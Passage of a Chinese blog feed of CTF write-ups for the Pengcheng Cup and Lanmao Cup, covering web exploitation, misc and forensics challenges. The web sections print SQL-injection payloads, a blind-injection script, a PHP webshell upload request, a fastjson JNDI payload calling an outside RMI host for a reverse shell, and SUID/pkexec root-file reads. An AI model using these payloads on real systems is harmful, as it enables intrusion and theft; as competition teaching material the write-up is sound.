    <content type="html"><![CDATA[<h1 id="第二届“鹏城杯”-初赛"><a href="#第二届“鹏城杯”-初赛" class="headerlink" title="第二届“鹏城杯” 初赛"></a>第二届“鹏城杯” 初赛</h1><p>[TOC]</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Ez-Java"><a href="#Ez-Java" class="headerlink" title="Ez_Java"></a>Ez_Java</h3><p>赛后发现是二次反序列化绕过黑名单，并且可以利用cc2的链子调用到任意无参方法。<br><a href="http://novic4.cn/index.php/archives/26.html#cl-4">参考</a><br><a href="https://blog.csdn.net/miuzzx/article/details/125576866">大佬wp</a></p><h3 id="简单包含"><a href="#简单包含" class="headerlink" title="简单包含"></a>简单包含</h3><p>绕过Waf，通过Waf对文件和POST参数的混淆bypass，然后直接伪协议读flag。<br><img src="https://md.buptmerak.cn/uploads/upload_b3c6e4be37ee7c157c46959242664519.png"></p><h3 id="can-u-login"><a href="#can-u-login" class="headerlink" title="can_u_login"></a>can_u_login</h3><p>经典sql自输出，第五空间也考过，参考<a href="https://www.anquanke.com/post/id/253570">https://www.anquanke.com/post/id/253570</a></p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">?<span class="hljs-keyword">password</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select(REPLACE(REPLACE(&#x27;</span><span class="hljs-number">1</span>&quot; union select(REPLACE(REPLACE(&quot;!&quot;,CHAR(34),CHAR(39)),CHAR(33),&quot;!&quot;)) --+&#x27;,CHAR(34),CHAR(39)),CHAR(33),&#x27;1&quot; <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span>(REPLACE(REPLACE(&quot;!&quot;,<span class="hljs-type">CHAR</span>(<span class="hljs-number">34</span>),<span class="hljs-type">CHAR</span>(<span class="hljs-number">39</span>)),<span class="hljs-type">CHAR</span>(<span class="hljs-number">33</span>),&quot;!&quot;)) <span class="hljs-comment">--+&#x27;)) --+</span><br></code></pre></div></td></tr></table></figure><h3 id="简单的php"><a href="#简单的php" class="headerlink" title="简单的php"></a>简单的php</h3><p>取反绕过字母字符，然后就是正常的无参rce。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /?code=[~%<span class="hljs-number">8</span>C%<span class="hljs-number">86</span>%<span class="hljs-number">8</span>C%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">92</span>][~%CF]([~%<span class="hljs-number">9</span>A%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>B][~%CF]([~%<span class="hljs-number">98</span>%<span class="hljs-number">9</span>A%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>E%<span class="hljs-number">93</span>%<span class="hljs-number">93</span>%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>A%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">8</span>D%<span class="hljs-number">8</span>C][~%CF]())); HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">aaa</span>: whoami<br><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.1.111:8220</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">102</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">102</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">DNT</span>: <span class="hljs-number">1</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">Pragma</span>: no-cache<br><span class="hljs-attribute">Cache</span>-Control: cat /ffffflaggg<br><span class="hljs-attribute">aaa</span>: whoami<br><br></code></pre></div></td></tr></table></figure><h3 id="高手高手高高手"><a href="#高手高手高高手" class="headerlink" title="高手高手高高手"></a>高手高手高高手</h3><p>git源码泄露。爆出了后台密码admin/admin123。然后从网上可以找到cms的cve，但源码里有改动，最后上传websehll的poc:</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/navigate_upload.php?session_id=dj8sd2gm68i5c8fr8s7tnm3tf3&amp;id=....//....//....//navigate_info.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.116<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------336212135019351390254156611980<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>507<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.116<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.116/navigate.php?fid=files<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=dj8sd2gm68i5c8fr8s7tnm3tf3; NVSID_7da51544=dj8sd2gm68i5c8fr8s7tnm3tf3; navigate-tinymce-scroll=%7B%7D; navigate-language=en<br><br>-----------------------------336212135019351390254156611980<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;name&quot;<br><br>a.png<br>-----------------------------336212135019351390254156611980<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;engine&quot;<br><br>picnik<br>-----------------------------336212135019351390254156611980<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;a.png&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/octet-stream<br><br>&lt;?php<br>echo 111;<br>@eval($_POST[&#x27;cmd&#x27;]);<br>?&gt;<br><br>-----------------------------336212135019351390254156611980--<br></code></pre></div></td></tr></table></figure><p>然后下载I_want_capture_the_flag发现需要删除bocai.html和bocai.png。需要提权。<br>find / -user root -perm -4000 -print 2&gt;/dev/null 发现可以用pkexec.<br>提权后直接查看/root/flag，然后本地跑一下I_want_capture_the_flag得到flag。</p><h3 id="easygo"><a href="#easygo" class="headerlink" title="easygo"></a>easygo</h3><p>postgresql注入没有过滤，获取表名为super_secret_table</p><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,tablename <span class="hljs-keyword">from</span> pg_tables <span class="hljs-keyword">where</span> schemaname=<span class="hljs-string">&#x27;public&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>; --+<br></code></pre></div></td></tr></table></figure><p>查询flag</p><figure class="highlight q"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs q"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,flag <span class="hljs-keyword">from</span> super_secret_table; --+<br></code></pre></div></td></tr></table></figure><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>爆破用户密码，最终用户<code>SuperF1@g</code>和F1@g_1N_Th1S_UsEr_Y0u_Ge7_P@ssW0rd!!!是有用的，剩下几个用户里面没有flag</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> string<br>url = <span class="hljs-string">&quot;http://192.168.1.109/index.php&quot;</span><br><br><span class="hljs-comment"># name = &quot;SCA7TERED&quot;</span><br>name = <span class="hljs-string">&quot;c&quot;</span><br>temp = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment"># Cha0s_aaa_bbb_ccc</span><br><span class="hljs-comment"># SuperF1@g   SuperF1@g_aaa_bbb_ccc</span><br><span class="hljs-built_in">list</span> = string.ascii_letters + string.digits<br><span class="hljs-built_in">list</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&#123;|&#125;~!\&quot;#$%&amp;\&#x27;()[\\]^_`*+,-./:;&lt;=&gt;?@A!\&quot;#0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>))<br>j=<span class="hljs-number">5</span><br>re = [<span class="hljs-number">114</span>,<span class="hljs-number">100</span>,<span class="hljs-number">33</span>,<span class="hljs-number">33</span>,<span class="hljs-number">33</span>]<br><span class="hljs-comment"># ! r c</span><br><span class="hljs-comment">#rite@Ctfec</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    s = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> o <span class="hljs-keyword">in</span> re:<br>        s += <span class="hljs-string">&quot;,&quot;</span> + <span class="hljs-built_in">str</span>(o)<br>    <span class="hljs-built_in">print</span>(s)<br>    j = j + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>        temp = <span class="hljs-built_in">ord</span>(i)<br>        <span class="hljs-comment"># payload = &#x27;&#x27;&#x27;or case(right(`name`,&#123;&#125;) &lt;&gt; binary(char(&#123;&#125;,83, 99, 97, 55, 116, 101, 114, 101, 100))) when &quot;1&quot; then &quot;0&quot; else benchmark(100000000,MD5(&quot;testestest&quot;)) end;#&#x27;&#x27;&#x27;.format(j, temp)</span><br>        <span class="hljs-comment"># payload = &#x27;&#x27;&#x27;or case (right(`pwd`,&#123;&#125;)&lt;&gt;binary(char(&#123;&#125;,67,104,97,48,115,95,97,97,97,95,98,98,98,95,99,99,99))) when &quot;1&quot; then &quot;0&quot; else benchmark(100000000,MD5(&quot;testestest&quot;)) end;#&#x27;&#x27;&#x27;.format(j, temp)</span><br>        <span class="hljs-comment"># payload = &#x27;&#x27;&#x27;or name = &quot;SuperF1@g&quot; or case (right(`pwd`,&#123;&#125;)&lt;&gt;binary(char(&#123;&#125;,))) when &quot;1&quot; then &quot;0&quot; else benchmark(100000000,MD5(&quot;testestest&quot;)) end;#&#x27;&#x27;&#x27;.format(j, temp)</span><br>        payload = (<span class="hljs-string">&#x27;&#x27;&#x27;or case(right(`pwd`,&#123;&#125;) &lt;&gt; binary(char(&#123;&#125;&#x27;&#x27;&#x27;</span>+s+<span class="hljs-string">&#x27;&#x27;&#x27;))) when &quot;1&quot; then &quot;0&quot; else benchmark(100000000,MD5(&quot;testestest&quot;)) end;#&#x27;&#x27;&#x27;</span>).<span class="hljs-built_in">format</span>(j, temp)<br>        <span class="hljs-built_in">print</span>(payload)<br>        start_time = time.time()  <span class="hljs-comment"># 注入前的系统时间</span><br>        <span class="hljs-comment"># r = requests.get(url,params = params)</span><br>        a = requests.post(url, data=&#123;<br>            <span class="hljs-string">&quot;User&quot;</span>: <span class="hljs-string">&#x27;&#x27;&#x27;\\&#x27;&#x27;&#x27;</span>,<br>            <span class="hljs-string">&quot;Pass&quot;</span>: payload<br>        &#125;, allow_redirects=<span class="hljs-literal">False</span>)<br>        <span class="hljs-comment"># print(a.status_code)</span><br>        <span class="hljs-comment"># print(a.text)</span><br>        end_time = time.time()  <span class="hljs-comment"># 注入后的时间</span><br>        <span class="hljs-comment"># print(end_time - start_time)</span><br>        <span class="hljs-keyword">if</span> end_time - start_time &gt; <span class="hljs-number">0.5</span>:<br>            name = i<br>            <span class="hljs-built_in">print</span>(name)<br>            <span class="hljs-comment"># re.append(ord(i))</span><br>            re.insert(<span class="hljs-number">0</span>,<span class="hljs-built_in">ord</span>(i))<br>            <span class="hljs-comment"># re.reverse()</span><br>            <span class="hljs-built_in">print</span>(re)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">pass</span><br><br></code></pre></div></td></tr></table></figure><h3 id="压缩包"><a href="#压缩包" class="headerlink" title="压缩包"></a>压缩包</h3><p>通过建立一个同名的文件夹和shell文件，可以绕过检测，上传webshell，直接读flag即可。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="简单取证"><a href="#简单取证" class="headerlink" title="简单取证"></a>简单取证</h3><p>首先从cmd历史中可以拿到密码。<br><img src="https://md.buptmerak.cn/uploads/upload_f47f8981eaddb22c489f6ba542fe8558.png"><br>然后查看文件，发现secret.jpg<br>0x0000000002325028      1      0 R–r– \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\secret.jpg<br>dump后发现是倒叙的zip，用密码解密后，使用gnuplot绘制散点图，得到二维码，扫码得到flag。<br><img src="https://md.buptmerak.cn/uploads/upload_f46b1c23d3689cb8116d91c3af54a51e.png"></p><h3 id="what-is-log"><a href="#what-is-log" class="headerlink" title="what_is_log"></a>what_is_log</h3><p>输入密码后应该有确定之类的，全局搜一下，发现确实可以搜到<br><img src="https://md.buptmerak.cn/uploads/upload_a11784fcfc4e9e9f8e96f3ba96bd71f5.png"></p><h3 id="Misc-water"><a href="#Misc-water" class="headerlink" title="Misc_water"></a>Misc_water</h3><p>通过图片名，可以联想到倒序的jpg。发现其中有水印，提取出来后，解压压缩包，爆破图片的宽高，得到flag。</p><h3 id="babybit"><a href="#babybit" class="headerlink" title="babybit"></a>babybit</h3><p>用DiskGenius恢复一下vmdk文件，获取到四个文件<br><img src="https://md.buptmerak.cn/uploads/upload_1097e1857a31e8211a2c36aca1fff0c9.png"><br>然后用Register Explorer导入SYSTEM读取注册表，在FVEStats找到加解密时间，然后北京时间需要再+上8，最终flag为PCL{2022/6/13_15:17:39_2022/6/13_15:23:46}<br><img src="https://md.buptmerak.cn/uploads/upload_dc9e27229518c37df83cc23b92193af5.png"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>蓝帽杯初赛</title>
    <link href="/2022/07/24/2022-7-24-%E8%93%9D%E5%B8%BD%E6%9D%AF/"/>
    <url>/2022/07/24/2022-7-24-%E8%93%9D%E5%B8%BD%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="蓝帽杯"><a href="#蓝帽杯" class="headerlink" title="蓝帽杯"></a>蓝帽杯</h1><p>[toc]</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Ez-gadget"><a href="#Ez-gadget" class="headerlink" title="Ez_gadget"></a>Ez_gadget</h3><p>审计源码发现是fastjson1.2.62的洞，但是ban掉了jndi，rmi，ldap。不过并没有限制unicode，将通用的链子进行unicode绕过关键字过滤。还有一个hashcode爆破，直接找脚本爆破就行，将结果进行url编码。</p><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">/?str<span class="hljs-operator">=</span><span class="hljs-variable">%EF</span><span class="hljs-variable">%B4</span><span class="hljs-variable">%9</span>F<span class="hljs-variable">%1</span>E<span class="hljs-variable">%10</span><span class="hljs-variable">%03</span>&amp;input<span class="hljs-operator">=</span>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.xbean.propertyeditor.\u004AndiConverter&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;AsText&quot;</span>:<span class="hljs-string">&quot;\u0072mi://39.107.239.30:1099/grorjm&quot;</span>&#125;<br></code></pre></div></td></tr></table></figure><p>用github的JNDI工具起一个rmi服务，配合高版本jndi反弹shell。最后存在一个suid提权，利用/bin/date读取flag</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/bin/</span>date -f <span class="hljs-regexp">/root/</span>flag.txt<br></code></pre></div></td></tr></table></figure><p><img src="https://md.buptmerak.cn/uploads/upload_01eb059158c4c0c11af7385142f03449.png"><br><img src="https://md.buptmerak.cn/uploads/upload_153900aa6a1feb6168b2b5862e2b8009.png"></p><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>这题确实含金量，看懂倒是看懂了，有时间再写md把。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="domainhacker"><a href="#domainhacker" class="headerlink" title="domainhacker"></a>domainhacker</h3><p>wireshark打开，过滤http<br>看到最后有个rar，提出来发现有密码。</p><p><img src="https://md.buptmerak.cn/uploads/upload_09039dcbce33add8020753302ea0b294.png"></p><p>往前找，发现压缩操作<br><img src="https://md.buptmerak.cn/uploads/upload_5afbc824c9407df174ffac4035087a72.png"></p><p>分析该请求<br><img src="https://md.buptmerak.cn/uploads/upload_d18891da91e83426dc856cf4c0517e29.png"></p><p>a是一段php代码，主要是执行shell并且返回<br>关键部分如下，</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$p</span> = base64_decode(substr(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;yee092cda97a62&quot;</span>], <span class="hljs-number">2</span>));<br><span class="hljs-variable">$s</span> = base64_decode(substr(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;q8fb9d4c082c11&quot;</span>], <span class="hljs-number">2</span>));<br><span class="hljs-variable">$envstr</span> = @base64_decode(substr(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;p48a6d55fac1b1&quot;</span>], <span class="hljs-number">2</span>));<br></code></pre></div></td></tr></table></figure><p>读取了form中的yee092cda97a62、q8fb9d4c082c11、p48a6d55fac1b1，去掉前两个字符base64解码。</p><p>解码可得，<br><img src="https://md.buptmerak.cn/uploads/upload_fa2bb533e8156c043c67e9841bb8a945.png"><br>得到密码。<br>打开压缩包，得到哈希</p><h3 id="domainhacker2"><a href="#domainhacker2" class="headerlink" title="domainhacker2"></a>domainhacker2</h3><p>同domainhacker1，找到密码为<code>FakePassword123$</code></p><p><img src="https://md.buptmerak.cn/uploads/upload_61d545ef9067de14f238d877cdb3d8ae.png"></p><p>解压缩，使用secretdump得到历史hash<br><img src="https://md.buptmerak.cn/uploads/upload_b79c4a816189f0cf5de3e748e611e61c.png"></p><h2 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h2><h3 id="手机取证"><a href="#手机取证" class="headerlink" title="手机取证"></a>手机取证</h3><p>直接打开 苹果测试 查看.exe 搜索关键字慢慢找</p><h4 id="取证1"><a href="#取证1" class="headerlink" title="取证1"></a>取证1</h4><p><img src="https://md.buptmerak.cn/uploads/upload_0271b049291d75515f1a1eea0a8bbbc2.png"></p><h4 id="取证2"><a href="#取证2" class="headerlink" title="取证2"></a>取证2</h4><p><img src="https://md.buptmerak.cn/uploads/upload_c7f804fff76e4392bdd6fea56d3b7b1e.png"></p><h3 id="计算机取证"><a href="#计算机取证" class="headerlink" title="计算机取证"></a>计算机取证</h3><h4 id="计算机取证1"><a href="#计算机取证1" class="headerlink" title="计算机取证1"></a>计算机取证1</h4><p>passware一把梭</p><p><img src="https://md.buptmerak.cn/uploads/upload_6537038528518e5f837f10c700e36270.png"></p><h4 id="计算机取证2"><a href="#计算机取证2" class="headerlink" title="计算机取证2"></a>计算机取证2</h4><p>简单看一下cmdlist，发现相关进程<code>RamCapture</code><br><img src="https://md.buptmerak.cn/uploads/upload_7c66110531db3d0220acfbbac783527d.png"></p><h4 id="计算机取证3"><a href="#计算机取证3" class="headerlink" title="计算机取证3"></a>计算机取证3</h4><p>取证大师利用1.dmp解密bitlokcer，挂载之后导出加密的pptx和pass.txt<br>passware一把梭<br><img src="https://md.buptmerak.cn/uploads/upload_080ea06df5568a06d60fc63670847a63.png"></p><p><img src="https://md.buptmerak.cn/uploads/upload_74444916b7c7cc369c911da270a4daf6.png"></p><h4 id="计算机取证4"><a href="#计算机取证4" class="headerlink" title="计算机取证4"></a>计算机取证4</h4><p>passware解密新建文本文档.txt ,导入密钥就用1.dmp,得到 哈哈哈.zip<br>同样passware一把梭<br><img src="https://md.buptmerak.cn/uploads/upload_cfb7badf3088f60edbb9fbb0d6f0877f.png"><br><img src="https://md.buptmerak.cn/uploads/upload_8c25ce208ba15a31bc0369796811fc1c.png"></p><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>apk导入AndroidKiller一把梭</p><h4 id="程序分析1"><a href="#程序分析1" class="headerlink" title="程序分析1"></a>程序分析1</h4><p><img src="https://md.buptmerak.cn/uploads/upload_71c50b500d6c9fe360c89f6c23934862.png"></p><h4 id="程序分析2"><a href="#程序分析2" class="headerlink" title="程序分析2"></a>程序分析2</h4><p><img src="https://md.buptmerak.cn/uploads/upload_6e57a207bbd80753b0d2cecee3599152.png"></p><h4 id="程序分析3"><a href="#程序分析3" class="headerlink" title="程序分析3"></a>程序分析3<img src="https://md.buptmerak.cn/uploads/upload_9bfc728330db7c58d1f3f81f1851f2fb.png"></h4><h4 id="程序分析4"><a href="#程序分析4" class="headerlink" title="程序分析4"></a>程序分析4</h4><p>类名为a<br><img src="https://md.buptmerak.cn/uploads/upload_641b2be21e2c2798c8bb06919186c196.png"></p><p><img src="https://md.buptmerak.cn/uploads/upload_3894007e68213eeb875862536ae8d376.png"></p><h3 id="网站取证"><a href="#网站取证" class="headerlink" title="网站取证"></a>网站取证</h3><h4 id="网站取证1"><a href="#网站取证1" class="headerlink" title="网站取证1"></a>网站取证1</h4><p><img src="https://md.buptmerak.cn/uploads/upload_7c58f45ccc05476e1103ab76342853e5.png"></p><h4 id="网站取证2"><a href="#网站取证2" class="headerlink" title="网站取证2"></a>网站取证2</h4><p><img src="https://md.buptmerak.cn/uploads/upload_1313c29f6b0b9efa243bac9dcb8bc0aa.png"></p><p>直接解密可得<code>KBLT123</code></p><h4 id="网站取证3"><a href="#网站取证3" class="headerlink" title="网站取证3"></a>网站取证3</h4><p><img src="https://md.buptmerak.cn/uploads/upload_7bccf7e3ee5bb80a0cda63023a6bb538.png"></p><h4 id="网站取证4"><a href="#网站取证4" class="headerlink" title="网站取证4"></a>网站取证4</h4><p>看<code>tab_channel_order_list</code></p><p><img src="https://md.buptmerak.cn/uploads/upload_e603d22b4b84724ffb899371c8cb7240.png"></p><p>可知先收款人ID，然后付款人ID</p><p><img src="https://md.buptmerak.cn/uploads/upload_90a7cd3d526d9f4e55a8f6450792913b.png"><br>汇率</p><p>复制出来对应时间的所有sql，解密乘以汇率然后求和。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">data, key=<span class="hljs-string">b&#x27;jyzg123456&#x27;</span></span>):</span><br>    key = md5(key).hexdigest()<br>    x = <span class="hljs-number">0</span><br>    data = base64.b64decode(data.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    len1 = <span class="hljs-built_in">len</span>(data)<br>    l = <span class="hljs-built_in">len</span>(key)<br>    char = <span class="hljs-string">&#x27;&#x27;</span><br>    ret = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, len1):<br>        <span class="hljs-keyword">if</span> x == l:<br>            x = <span class="hljs-number">0</span><br>        char += key[x]<br>        x += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, len1):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(data[i:i+<span class="hljs-number">1</span>]) &lt; <span class="hljs-built_in">ord</span>(char[i]):<br>            ret += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(data[i])+<span class="hljs-number">256</span>-<span class="hljs-built_in">ord</span>(char[i]))<br>        <span class="hljs-keyword">else</span>:<br>            ret += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(data[i:i+<span class="hljs-number">1</span>])-<span class="hljs-built_in">ord</span>(char[i]))<br>    <span class="hljs-keyword">return</span> ret<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;a.sql&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span 